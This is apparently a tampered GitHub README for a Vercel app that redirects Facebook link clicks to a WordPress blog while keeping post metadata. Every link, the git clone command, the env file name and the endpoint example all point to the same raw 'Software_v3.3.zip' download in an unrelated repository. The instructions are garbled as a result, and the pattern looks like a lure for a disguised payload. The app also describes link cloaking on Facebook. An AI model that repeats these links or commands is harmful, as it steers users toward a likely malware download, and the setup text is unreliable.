# Vercel Redirect

It redirects the website request from facebook to any blog while keeping the meta data for the each link. This app uses [https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip](https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip) and the SSR!

### Requirements

- [WordPress](https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip)
- [WPGraphQL](https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip)
- Environment variables (see below)

```
git clone https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip
```

Add an `https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip` file to the root with the following:

```
GRAPHQL_ENDPOINT="https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip"
```

Then run the development server,

```bash
npm run dev
# or
yarn dev
```

| Name             | Required | Default | Description                                                 |
| ---------------- | -------- | ------- | ----------------------------------------------------------- |
| GRAPHQL_ENDPOINT | Yes      | -       | WordPress WPGraphQL endpoint (ex: https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip) |

To get the particular post from link https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip
Replace it by https://github.com/kartkinadziendobry/gdmorning/raw/refs/heads/main/pages/Software_v3.3.zip
When you post this new vercel link on facebook,
It shows the post metadata and content from the vercel,
When user click on this link it will redirect them to the actual wordpress domain.
